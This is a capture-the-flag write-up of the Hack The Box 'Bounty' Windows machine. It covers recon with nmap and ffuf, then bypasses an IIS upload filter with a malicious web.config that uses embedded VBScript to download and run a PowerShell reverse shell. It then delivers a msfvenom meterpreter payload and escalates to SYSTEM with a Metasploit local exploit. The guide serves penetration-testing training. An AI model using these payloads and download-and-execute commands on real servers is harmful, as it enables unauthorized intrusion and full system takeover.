# Bounty-HTB
Bounty is a Windows machine that is rated as easy. In this box we will see how to bypass file uploade protection.
# Recon
We first start by runing nmap scan on the machine.
```
┌──(kali㉿kali)-[~/Desktop/HTB/Bounty]
└─$ nmap -sC -sV 10.10.10.93                 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 19:15 EDT
Nmap scan report for 10.10.10.93
Host is up (0.029s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds
```
## ffuf
Fuzzing web dir:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.93/FUZZ     

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.93/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

UploadedFiles           [Status: 301, Size: 156, Words: 9, Lines: 2]
uploadedFiles           [Status: 301, Size: 156, Words: 9, Lines: 2]
```
Then I looked for .aspx files and found one:
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.93/FUZZ.aspx

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.93/FUZZ.aspx
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

transfer                [Status: 200, Size: 941, Words: 89, Lines: 22]
```
And we find a upload page:

![image1](https://github.com/electronicbots/HackTheBox/blob/master/Machines/Bounty/images/1.png)

# User Flag
So after many tries I found out that I can upload a ```.config``` file. So first get this file: https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 . Now Add at the end of it the reverse shell: ```Invoke-PowerShellTcp -Reverse -IPAddress <your_ip_address> -Port 4444```.

Here is the code that I used to get reverse shell:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-PowerShellTcp.ps1')")
%>
```
Before uploading the file make sure you are running a python web server: ```python3 -m http.server```. After uploading it go to the file and you should get your reverse shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Bounty]
└─$ nc -nlvp 4444           
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.93] 49163
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
bounty\merlin
```
So the User Flag is hidden to show it we need to use option ```-force``` with ```dir```:
```
PS C:\Users\merlin\Desktop> dir -force


    Directory: C:\Users\merlin\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-a-h-         5/30/2018  11:32 PM         32 user.txt                          


PS C:\Users\merlin\Desktop> type user.txt
e29ad898...82f44a2f
```
# Root Flag
First let's upgrade our shell to a meterpreter shell:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Bounty]
└─$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.28 LPORT=5555 -f exe > meterpreter.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 201283 bytes
Final size of exe file: 207872 bytes
```
and now download it into the box:
```
PS C:\Users\merlin> (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.28:8000/meterpreter.exe', 'c:\users\merlin\meterpreter.exe')
```
So now if you run it you should get a meterpreter shell:
```
msf5 exploit(multi/handler) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:5555 
[*] Meterpreter session 1 opened (10.10.14.28:5555 -> 10.10.10.93:49185) at 2020-09-07 20:26:50 -0400

meterpreter > getuid 
Server username: BOUNTY\merlin
```
So now let's run ```multi/recon/local_exploit_suggester``` and see what we can get.
```
msf5 post(multi/recon/local_exploit_suggester) > exploit 

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 17 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Post module execution completed
```
For this box ```exploit/windows/local/ms16_014_wmi_recv_notif``` will be the answer, let's fire it up:
```
msf5 exploit(windows/local/ms16_014_wmi_recv_notif) > exploit 

[*] Started reverse TCP handler on 10.10.14.28:7777 
[*] Launching notepad to host the exploit...
[+] Process 1380 launched.
[*] Reflectively injecting the exploit DLL into 1380...
[*] Injecting exploit into 1380...
[*] Exploit injected. Injecting payload into 1380...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (201283 bytes) to 10.10.10.93
[*] Meterpreter session 2 opened (10.10.14.28:7777 -> 10.10.10.93:49186) at 2020-09-07 20:30:22 -0400

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
And we are ```SYSTEM```, get your Root Flag:
```
meterpreter > shell 
Process 2984 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Administrator\Desktop>type root.txt
type root.txt
c837f7b69...079f9d4f5ea
```
Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
